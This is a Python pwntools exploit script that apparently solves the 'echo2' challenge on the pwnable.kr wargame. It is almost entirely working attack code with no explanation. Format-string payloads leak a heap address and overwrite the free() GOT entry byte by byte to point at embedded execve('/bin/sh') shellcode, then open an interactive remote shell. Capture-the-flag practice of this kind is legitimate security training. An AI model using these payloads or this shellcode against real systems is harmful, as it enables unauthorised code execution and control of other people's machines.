# -*- coding: utf-8 -*-
from pwn import *

remoto = False
remoto = True
if remoto:
	host = '0'
	host = 'pwnable.kr'
	conn = connect(host, 9011)
else:
	conn = process('./echo2')

nombre = 'physics'
# https://www.exploit-db.com/exploits/42179
shellcode = 'A' + 'B' * 29 + 'C'
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#nombre = shellcode
free_GOT = 0x602000
obj_o = 0x602098

assert len(shellcode) < 32

def read_addr(address, text=False):
	conn.sendline('2')
	conn.recvuntil('\n')
	payload  = '%7$s    '
	payload += p64(address)
	conn.sendline( payload )
	#print conn.recvuntil('\n')
	#print conn.recvuntil('\n')
	addr = conn.recvuntil('    ')[:-4]
	if text is False:
		addr += '\x00' * (8 - len(addr))
		addr  = u64(addr)
	conn.recvuntil('> ')
	return addr

def main():
	print ''
	conn.recvuntil('name? : ')
	conn.sendline(nombre)
	conn.recvuntil('> ')

	### get shellcode addr
	##conn.sendline('2')
	##conn.recvuntil('\n')
	##conn.sendline('%10$p')
	##line = conn.recvline()
	##leak = int(line[2:], 16)
	##print 'stack leak:' + hex(leak)
	##shellcode_addr = leak - 32
	##print 'shellcode addr:' + hex(shellcode_addr)
	##print ''
	##conn.recvuntil('> ')
	#print read_addr(shellcode_addr, text=True)
	#for i in range(0x100):
	#	print str(i)
	#	try:
	#		print hex(leak-(i*8))
	#		print read_addr(leak-(i*8), text=True)
	#	except:
	#		pass




	leak = read_addr(obj_o)
	print 'heap leak:' + hex(leak)
	shellcode_addr = leak + 48
	print 'shellcode addr:' + hex(shellcode_addr)
	if len(hex(shellcode_addr)) > 8:
		print 'Try again'
		conn.close()
		return
	#conn.sendline('3')
	#shellcode = 'A' + 'B' * 29 + 'C'
	#conn.sendline(shellcode)
	#conn.recvuntil('> ')
	#for i in range(0x100):
	#	print str(i)
	#	try:
	#		print hex(leak+(i*8))
	#		print read_addr(leak+(i*8), text=True)
	#	except:
	#		pass
	#return

	# get shellcode addr
	#if len(hex(shellcode_addr)) > 8:
	#	print 'try again'
	#	return
	#print 'shellcode addr:' + hex(shellcode_addr)



	# wipe free got adddr
	conn.sendline('2')
	conn.recvuntil('\n')
	payload  = '%7$lln  '
	payload += p64(free_GOT)
	conn.sendline( payload )
	conn.recvuntil('> ')

	# overwrite free got adddr
	sh_bytes = hex(shellcode_addr)[2:]
	b1 = (2, int(sh_bytes[0:2],   16))
	b2 = (1, int(sh_bytes[2:4],   16))
	b3 = (0, int(sh_bytes[4:6],   16))
	sh_bytes = [b1, b2, b3]

	for sh_byte in sh_bytes:
		pos, lenght = sh_byte
		if lenght < 8:
			print 'try again'
			conn.close()
			return
		else:
			conn.sendline('2')
			conn.recvuntil(nombre)
			print 'escribo:' + hex(lenght)
			extra = len(str(lenght))
			payload  = '%{:d}x'.format(lenght - (8 - extra))
			payload += ' ' * (8 - extra)
			payload += '%8$hhn'
			payload += p64(free_GOT +  pos)
			conn.sendline( payload )
			conn.recvuntil('> ')

	print 'new free addr:' + hex(read_addr(free_GOT))
	#print 'shellcode:' + read_addr(shellcode_addr, text=True)

	# pwn
	conn.sendline('3')
	conn.sendline(shellcode)
	conn.interactive()
	conn.close()

if __name__ == '__main__':
	main()
	try:
		pass#main()
	except KeyboardInterrupt as e:
		pass
